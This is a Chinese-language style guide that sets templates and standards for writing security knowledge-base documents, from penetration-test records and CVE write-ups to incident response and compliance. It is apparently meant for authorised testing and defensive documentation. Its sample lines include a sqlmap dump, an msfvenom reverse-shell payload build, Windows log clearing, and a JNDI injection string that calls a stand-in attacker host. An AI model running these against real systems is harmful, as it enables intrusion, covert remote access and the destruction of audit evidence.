## 一、渗透测试板块

### 1.1 作战记录（6 段）

**模板：** 基础信息 → 暴露面 → Web探测 → 旁站 → 关键发现 → 风险矩阵

**各段详解：**

- **基础信息：** 目标域名/IP、测试时间、授权范围、测试人员、工具版本。必须写明本次测试的背景（如"客户要求对某电商系统进行黑盒渗透"），而非简单罗列字段。
- **暴露面：** 列出公网开放端口、服务版本、CDN/WAF 情况。给出扫描结果摘要（如 `nmap -sV` 发现 80/443/8080），分析哪些是高危入口。
- **Web探测：** 指纹识别、目录爆破、敏感文件。体现因果链——为什么探测这个路径？例如"根据 `robots.txt` 发现 `/admin` 路径，进一步爆破得到后台登录页面"。
- **旁站：** 同 IP 站点、子域名枚举。分析与主站关联性（共享 session、相同数据库）。
- **关键发现：** 按危害排列漏洞，每个含复现步骤、影响、利用难度。用实操请求证明，例如 SQL 注入的 payload 及回显。
- **风险矩阵：** CVSS + 资产重要性 + 修复优先级 + 建议修复时间。结合业务场景调整分数。

**硬性标准落地方案：**

- 开头直接从"客户反馈首页出现异常登录框"切入，非"什么是渗透测试"。
- 每个发现追问"为什么能成功？"（未过滤参数→后端拼接 SQL→无 WAF）。
- 安全三棱镜：攻击面（暴露端口）、防御（WAF 规则缺失）、检测（日志未记录 SQL 注入尝试）。
- 实操：`sqlmap -u "http://target/page?id=1" --batch --dbs` 预期输出 `available databases [5]`。
- 代码块标注语言（bash/sql/http），HTTP 报文用原始格式（不带 curl 转换），路径用 `inline_code`。

### 1.2 JS 逆向分析（8 段）

**模板：** 基础信息 → 文件概览 → 接口提取 → 敏感信息泄露 → 加密/签名逻辑 → 核心业务逻辑 → 漏洞利用链 → 风险矩阵

**各段详解：**

- **基础信息：** 目标 URL、JS 文件列表、抓包工具（Chrome DevTools/Fiddler）、分析时间。
- **文件概览：** JS 文件大小、是否混淆、加载方式。重点标注混淆/压缩文件（webpack chunk）。
- **接口提取：** 搜索 `api`、`url`、`fetch` 关键字，列出后端接口路径、方法、参数。注明接口来源（哪个 JS 文件的哪一行）。
- **敏感信息泄露：** 硬编码的 API Key、Secret、Token、内网地址、注释中的测试账号。提供精确行号。
- **加密/签名逻辑：** 加密函数（AES/RSA/MD5）、签名算法（时间戳+随机数+密钥拼接）。写出完整加密流程伪代码，指出可被破解的弱点（如密钥在前端硬编码）。
- **核心业务逻辑：** 订单提交、支付、登录等 JS 逻辑。分析逻辑缺陷（金额修改、重放攻击）。
- **漏洞利用链：** 组合弱点成完整攻击链。每步配 JS 代码或请求示例。
- **风险矩阵：** 同作战记录。

**硬性标准落地方案：**

- 从"登录请求密码被加密，怀疑前端鉴权有绕过"开始。
- 因果链：为什么加密能被破解？密钥写死在 `main.js:1024` 且未动态变化。
- 三棱镜：攻击面（暴露的接口）、防御（前端加密误导开发者以为安全）、检测（服务端应校验签名完整性）。
- 实操：`console.log(decrypt("密文", key))` 预期输出明文，证明解密可行。
- 代码块：JavaScript 用 `javascript`，HTTP 用原始报文。

**关联文档规则（JS 分析 ↔ 作战记录）：**

JS 分析如果是某次信息收集/打点过程中发现的，必须双向关联：

- JS 分析文档基础信息段写入：`关联作战记录：[目标域名 - 信息收集记录](飞书文档链接)`
- 作战记录 Web 探测段写入：`JS 分析详见：[JS 逆向分析 - xxx.js](飞书文档链接)`

### 1.3 内网渗透（6 段）

**模板：** 信息收集 → 权限提升 → 域环境 → 横向移动 → C2/隧道 → 规避技巧

**各段详解：**

- **信息收集：** 内网存活主机、开放端口、域控信息。用 `net view`、`arp -a`、`nbtscan` 输出，分析关键资产（域控制器、文件服务器）。
- **权限提升：** 本地提权漏洞（PrintNightmare、土豆系列）、错误配置（AlwaysInstallElevated、服务权限）。执行过程 + 预期结果（`whoami` → SYSTEM）。
- **域环境：** 域用户枚举、Kerberoasting、AS-REP Roasting、黄金票据。说明域信任关系、OU 结构。
- **横向移动：** 哈希传递（PsExec/WMI）、RDP、SMB 共享、计划任务。每条命令附预期输出。
- **C2/隧道：** C2 框架（CobaltStrike/Metasploit）、通信协议（HTTPS/DNS/SMB）、绕过出站防火墙方法。
- **规避技巧：** 日志清理（`wevtutil cl System`）、杀软绕过（进程镂空、DLL 劫持）、痕迹清除。配合实际工具。

**硬性标准落地方案：**

- 从"获得一台 Web 服务器 webshell 后，如何拿下域控"切入。
- 因果链：为什么能提权？服务器未打补丁 KB5004945，导致 PrintNightmare 可用。
- 三棱镜：攻击面（开放 445 端口）、防御（未启用 AppLocker）、检测（Sysmon 未监控 wmi-exec）。
- 实操：`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... -f exe > shell.exe`。
- 代码块：PowerShell/CMD/Metasploit 分别标注。

### 1.4 工具文档（7 段）

**模板：** 概述 → 安装（GitHub+Releases）→ 配置 → 基础用法 → 场景示例 → 高级用法 → 注意事项+参考链接

**各段详解：**

- **概述：** 工具名称、作者、功能、适用场景。一句话解决什么问题（如"subfinder 是一款快速子域名枚举工具，用于被动信息收集"）。
- **安装：** GitHub 仓库地址、Release 下载、编译安装（go install / pip install）、Docker。多系统命令。
- **配置：** 配置文件路径、API Key 设置（Shodan/Virustotal）、代理配置。举例说明。
- **基础用法：** 最常用 3-5 个命令，附实际输出样例。
- **场景示例：** 真实场景组合用法。如"使用 subfinder + httpx + nuclei 全自动漏洞发现"，展示完整命令链和结果分析。
- **高级用法：** 管道组合、自定义输出格式（JSON/CSV）、插件编写、并发控制。解释原理。
- **注意事项：** 速率限制、法律风险、常见报错及解决。官方文档链接。

**硬性标准落地方案：**

- 从"需要快速收集某域名的子域名，但手工太慢"开始。
- 因果链：为什么选 subfinder？聚合了多个被动源，比单源更全面。
- 实操：`subfinder -d example.com -silent` 预期输出子域名列表。
- 代码块：bash/yaml/json。

## 二、安全运营板块

### 2.1 CVE 漏洞情报（9 段）

**模板：** 基本信息 → 影响组件 → 漏洞原理 → 利用条件 → 测绘 → PoC → 修复 → 关联 → 参考

**各段详解：**

- **基本信息：** CVE 编号、CVSS、披露日期、漏洞类型（RCE/SSRF/SQLi）。
- **影响组件：** 产品名称、受影响版本范围。精确到小版本。
- **漏洞原理：** 用通俗语言解释触发机制，必要时引用源码片段。自己归纳，不复制官方描述。
- **利用条件：** 认证需求、网络可达性、特殊配置（debug 模式开启等）。列出必要条件。
- **测绘：** 仅 Quake 检索语法（用户仅有 Quake 权限），不写 Fofa/Shodan。纯检索表达式，不写 API 调用格式。

```
service:"Splunk" AND port:8000
```

- **PoC：** GitHub 仓库已实际 fork 到 `c1ayooo/CVE-XXXX-XXXXX`，文档引用真实地址。不写"建议 fork"。HTTP 验证请求用原始报文，无 curl。
- **修复：** 官方补丁版本、临时缓解措施。区分紧急修复和长期方案。
- **关联：** 与该 CVE 相关的其他漏洞、攻击链组合。
- **参考：** 官方通告、分析文章、漏洞库链接。

**硬性标准落地方案：**

- 从"最近爆出的 Log4j 漏洞如何影响我们的系统"切入。
- 因果链：为什么 JNDI 注入能 RCE？lookup 方法会远程加载恶意 class。
- 三棱镜：攻击面（暴露的 LDAP 端口）、防御（是否开启了 `log4j2.formatMsgNoLookups`）、检测（流量中 `${jndi:` 特征）。
- 实操：原始 HTTP 报文验证，如发送 `${jndi:ldap://attacker.com/a}` 到目标，预期收到 DNS 请求。
- 代码块：python/bash/http。

> 自动分类（厂商/产品分层）仅对 2.4 的 CVE 漏洞情报生效。

### 2.2 应急响应（6 段）

**模板：** 事件概述 → 影响范围 → 攻击链路复盘 → 处置过程 → 根因分析 → 改进建议

**各段详解：**

- **事件概述：** 发现时间、上报人、事件类型（勒索/挖矿/数据泄露）、初步定性。一句话概括。
- **影响范围：** 受影响 IP、系统、业务、数据。需量化（如"共 3 台服务器，涉及核心交易数据库"）。
- **攻击链路复盘：** 按时间线还原攻击者行为（初始访问→持久化→横向移动→目的）。每步附日志或取证截图。
- **处置过程：** 隔离主机、阻断 IP、清除恶意文件、恢复服务。写明具体命令和效果。
- **根因分析：** 根本原因（弱口令/未修复漏洞/配置错误），用 5Why 分析法，避免只写表面原因。
- **改进建议：** 短期加固（改密码/打补丁）、长期建设（引入 EDR/加强日志审计）。指定负责人和完成时限。

**硬性标准落地方案：**

- 从"突然收到大量告警，某主机外联可疑域名"开始。
- 因果链：为什么能植入挖矿？Redis 未授权访问且未设密码。
- 三棱镜：攻击面（6379 端口暴露）、防御（无认证）、检测（未监控 Redis 命令）。
- 实操：`redis-cli -h target info` 预期返回 `# Server`，证明未授权。
- 代码块：bash/log。

### 2.3 安全运营（5 段）

**模板：** 资产台账 / 巡检 / 告警研判 / 指标 / SLA

- **资产台账：** 资产清单（IP、责任人、OS、端口、应用版本）。更新频率和自动化手段（CMDB + 定时扫描）。
- **巡检：** 每日/每周内容（漏洞扫描、基线检查、日志完整性）。具体脚本或工具。
- **告警研判：** 分级规则、误报处理、升级机制。举例说明（如"IPS 告警 SQL 注入，先查 WAF 日志确认是否拦截，再溯源源 IP"）。
- **指标：** MTTD、MTTR、修复率、降噪率。定义计算方法。
- **SLA：** 不同级别的响应时间承诺，明确责任人和升级路径。

**硬性标准落地方案：**

- 从"当前告警太多，无法区分优先级"切入。
- 因果链：为什么告警量大？规则阈值太低且未关联上下文。
- 实操：`grep -c "CRITICAL" /var/log/syslog` 作为告警量基线。

## 三、安全合规板块

### 3.1 等保知识点（5 段）

**模板：** 定级依据 → 测评要求 → 扣分点 → 安全管理制度 → 案例

- **定级依据：** GB/T 22240 确定等级，举例说明（如"三级系统要求每年一次渗透测试"）。
- **测评要求：** 物理/网络/主机/应用/数据逐条列出并对比现状。
- **扣分点：** 常见不符合项（如未启用密码复杂度、日志留存不足 6 个月）+ 整改建议。
- **安全管理制度：** 制度文件清单，制度与技术对应关系。
- **案例：** 某单位等保测评实例，差距分析和整改前后对比。

**硬性标准落地方案：**

- 从"公司系统即将接受等保测评，如何准备"开始。
- 因果链：为什么日志留存不足会被扣分？《网络安全法》要求不少于 6 个月。
- 实操：`auditctl -w /etc/passwd -p wa -k passwd_change` 预期添加审计规则。
- 代码块：bash/conf。

### 3.2 合规自查（4 段）

**模板：** 自查范围 → 自查项 → 风险评估 → 合规差距

- **自查范围：** 覆盖系统、部门、区域。明确边界。
- **自查项：** 按技术和管理两个维度列出检查条目，注明检查方法和判定标准。
- **风险评估：** 对不符合项赋分并排序。
- **合规差距：** 与法规/标准的差距总结，每项差距关联具体条款。

**硬性标准落地方案：**

- 从"年底合规检查，发现很多配置不符合 ISO27001 要求"开始。
- 因果链：为什么 HTTPS 未强制？nginx 配置未添加 SSL 重定向。
- 实操：`openssl s_client -connect target:443` 预期返回证书链。
- 代码块：bash/nginx。

## 四、安全开发板块

### 4.1 Python 安全脚本（5 段）

**模板：** 用途 → 依赖 → 核心逻辑 → 使用示例 → 注意事项

- **用途：** 脚本解决的具体问题（如"批量检测 CVE-2026-1234"）。一句话说清输入输出。
- **依赖：** Python 版本、第三方库、安装方式（`pip install -r requirements.txt`）。
- **核心逻辑：** 分步骤算法流程，配合关键代码片段，解释设计原因。
- **使用示例：** 命令行参数说明、运行命令、预期输出（含成功/失败两种结果）。
- **注意事项：** 网络超时处理、反爬机制、合法使用声明、常见错误及解决办法。

**硬性标准落地方案：**

- 从"需要批量验证内网主机是否存在 MS17-010 漏洞"开始。
- 因果链：为什么用 SMB 协议检测？永恒之蓝利用的正是 SMBv1 漏洞。
- 实操：`python scanner.py -f targets.txt -o result.csv` 预期输出 `192.168.1.10: Vulnerable`。
- 代码块：python/bash。

### 4.3 自动化检测（API参考）← 新增

**模板：** 问题 → 认证 → 通用请求结构 → 接口清单（分组）→ 附录（响应码/参数全集）

**各段详解：**

- **问题：** 从具体痛点出发——"运营团队需要将平台能力集成到自动化运维流程，但缺乏统一 API 参考"或"SOC 需要接入情报查询能力，但接口参数复杂"。
- **认证：** API Key、Token、OAuth 等认证方式说明，给出具体计算示例（如 HMAC-SHA1 签名算法）。
- **通用请求结构：** 服务地址、接口前缀、通信协议、请求方法、字符编码。统一前缀写成 `inline_code`。
- **接口清单（按功能分组）：** 每个分组一个二级标题，每个接口包含：
  - 接口用途说明（1-2句）
  - `地址：curl/GET /prefix/endpoint`
  - 请求参数用子弹列表列出参数名、必填、说明
  - 请求/响应示例放在 code block（语言标注 json/bash/http）
  - 有频率限制或权限要求需注明
- **附录：** 响应 Code 对照表、参数全集、枚举值列表（用子弹列表代替表格 `- 0 — 成功`）

**硬性标准落地方案：**

- 从"每次对接都要翻几十页 PDF"开始，而非"微步 NGTIP 提供了丰富的 API 接口"。
- 因果链：为什么用 Token 校验？API Key 静态校验存在泄露风险，动态 Token 增加安全性。
- 实操：cURL 或 Python 示例必须可直接运行（URL 中的 `YOUR_IP` 标注为占位符）。
- 禁止：表格用 pipe 分隔 → 改用子弹列表（`- apikey（必填）— API Key`）。
- 代码块：示例 JSON、Python、cURL 分别标注语言。HTTP 请求用原始报文格式。

## 五、五条硬性标准详解

### 标准 1：从问题/trade-off 出发

文档首段必须是具体的问题、痛点或矛盾，而不是定义或背景介绍。

- ❌ "SQL 注入是一种常见的 Web 漏洞。"
- ✅ "用户登录接口频繁返回 500 错误，怀疑存在布尔盲注。"
- 工具文档："我需要快速扫描 1000 个目标，但 nmap 太慢怎么办？"
- 应急响应："今天早上收到告警，数据库服务器出现异常外连。"
- 合规文档："距离等保测评还有两周，发现日志服务器磁盘满了。"

### 标准 2：因果链分析

不能只堆砌现象，要追问每一步的原因和结果，形成逻辑链条。

- ❌ "服务器存在弱口令，攻击者登录后植入木马。"
- ✅ "服务 `http://target/` 对外暴露 admin 接口 → 攻击者通过 hydra 暴力破解成功 → 获得普通用户权限 → 利用 `sudo` 配置错误（`ALL ALL NOPASSWD`）提权至 root → 下载挖矿程序并添加 cron 持久化。"

### 标准 3：安全三棱镜

从攻击面、防御、检测三个视角审视问题。非 CVE/非攻击类文档可省略。

- **攻击面：** 列出所有可能被利用的入口。
- **防御：** 现有安全措施及其不足之处。
- **检测：** 如何发现攻击行为（日志、流量、端点检测）。

### 标准 4：实操验证对应因果链

每一个因果推理步骤都必须有对应的命令或操作，并给出预期输出解读。

- 每个命令紧跟"预期输出"和"如何解读"。
- PoC 给出成功和失败的判断标准。
- 工具文档给出运行前后的对比。

### 标准 5：代码块标注语言 + inline_code

- 代码块用三个反引号 + 语言标注。
- HTTP 请求/响应必须用原始报文格式（直接展示 GET/POST 行 + Header + Body），禁止 curl 代替。
- 文件路径、IP 地址、变量名一律 `inline_code`。
- 路径中的空格或特殊字符需转义或加引号，但仍用 `inline_code`。

```http
# ✅ 正确
GET /admin HTTP/1.1
Host: target.com
Cookie: session=abc123
```

```bash
# ❌ 禁止
curl -X GET -b "session=abc123" http://target.com/admin
```
